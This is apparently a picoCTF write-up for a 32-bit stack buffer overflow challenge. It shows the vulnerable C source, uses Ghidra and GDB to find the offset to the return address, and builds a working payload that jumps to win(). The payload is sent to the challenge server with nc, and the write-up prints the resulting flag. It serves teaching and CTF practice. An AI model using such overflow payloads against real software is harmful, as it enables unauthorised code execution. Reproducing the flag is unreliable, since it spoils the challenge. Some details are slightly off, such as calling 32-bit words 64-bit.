**Description**

Author: Sanjay C / Palash Oswal

Control the return address

Hints
(none)

**Tools**

This writeup is a continuation of [buffer overflow 0](./binary/bufferoverflow0(100).md).
Please see this writeup if you don't understand the basics of a buffer overflow.

In this writeup and subsequent binary exploitation writeups, I will be using the tools [Ghidra](https://github.com/NationalSecurityAgency/ghidra), [GDB](https://en.wikipedia.org/wiki/GNU_Debugger), and an extension for GDB called [pwndbg](https://github.com/pwndbg/pwndbg).
This tools together provide excellent static and dynamic analysis of a binary. 
Another tool to look at is radare2, however I did not use it for this writeup.
This competition is an excellent place to learn how to use these programs, however I will not be teaching them in entirety.

**Research**

Lets open our source file and see if we can spot our goal:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We need to overflow the buffer buf in the funciton vuln with gets. Our flag is positioned in the function win, in which the only condition of it printing is entering the function.

Lets take a moment to look at the stack with this diagram:
![Image](https://www.secpod.com/blog/wp-content/uploads/2013/12/Untitled123.png)

We need to overwrite the stack from our variable, until we reach the return address, and then set the 4 bytes stored in there to the correct value that we want our program to return to.

Reading the assembly in Ghidra's code browser lets us see where we need to go to in the compiled binary.
You can search the file for functions by pressing G, and then searching for the function we want
win() is located at ```0x080491f6```

If we overwrite the return pointer, we can jump to that location

**Exploit**

So, we know where we overflow, what we need to overflow, and what to put in the overflow
Lets build an exploit using pwngdb and Ghidra

Try and run the file with GDB
```gdb vuln```

The input ```r``` will run the program, and ```continue``` will continue execution of the program at a breakpoint

Now, lets set some breakpoints to debug

```break *(vuln+34)```

```break *(win)```

This should pause when we enter the functions vuln and win

Now, lets pass input into the program automatically with python and set inputs

```r <<< $(python2 -c 'print("a"*32 + "b"*16)')```

This should overwrite the program and cause it to crash.
It should fill up the variable with a's (0x61) and then the next 16 locations with b's (0x62)

With our breakpoints, we should see this happen after using the continue command once after running and seeing the stack.
We can view the stack after the register ```esp``` with the command ```x/40x $esp```. This should print the next 40 64 bit values in stack. esp+0x10 = the start of our variable, and we can see it here.

```GDB
pwndbg> x/40x $esp
0xffffcef0:	0xffffcf00	0xf7fa5000	0xf7fa5dbc	0x08049291
0xffffcf00:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcf10:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcf20:	0x62626262	0x62626262	0x62626262	0x62626262
0xffffcf30:	0x00000000	0xffffcff4	0xffffcffc	0x000003e8
0xffffcf40:	0xffffcf60	0x00000000	0x00000000	0xf7dd4ee5
0xffffcf50:	0xf7fa5000	0xf7fa5000	0x00000000	0xf7dd4ee5
0xffffcf60:	0x00000001	0xffffcff4	0xffffcffc	0xffffcf84
0xffffcf70:	0xf7fa5000	0x00000000	0xffffcfd8	0x00000000
0xffffcf80:	0xf7ffd000	0x00000000	0xf7fa5000	0xf7fa5000
```

The return pointer is at 0xffffcf2b right now, or 12 characters after the end of our variable buffer. It is called EIP, and is stored this distance from the end of the local variables in stack.

lets try and overwrite it agian to verify that this is what we are overwriting

```r <<< $(python2 -c 'print("a"*32 + "b"*12 + "cccc")')```

```continue```

This should try and jump to ```0x63636363```

Lets make this jump to our win funciton located at ```0x080491f6```

```r <<< $(python2 -c 'print("a"*32 + "b"*12 + "\x08\x04\x91\xf6")')```

This doesn't work, it tries to jump to 0xf6910408. Why? This program is in [Little Endian](https://www.section.io/engineering-education/what-is-little-endian-and-big-endian/) format

Lets fix our exploit to:

```r <<< $(python2 -c 'print("a"*32 + "b"*12 + "\xf6\x91\x04\x08")')```

The program jumps into win after continuing, and it prints our flag! This should now work outside of the GDB environment now. It still crashes as we overwrote some things like what it should return into next to gracefully exit the program, but it still prints our flag which is what we care about.

Double checking outside of GDB:

```python2 -c 'print("a"*32 + "b"*12 + "\xf6\x91\x04\x08")' | ./vuln```

Using picoCTF's server to get the flag:

```python2 -c 'print("a"*32 + "b"*12 + "\xf6\x91\x04\x08")' | nc saturn.picoctf.net 65402```

It returns our flag!
It is: ```picoCTF{addr3ss3s_ar3_3asy_b9797671}```
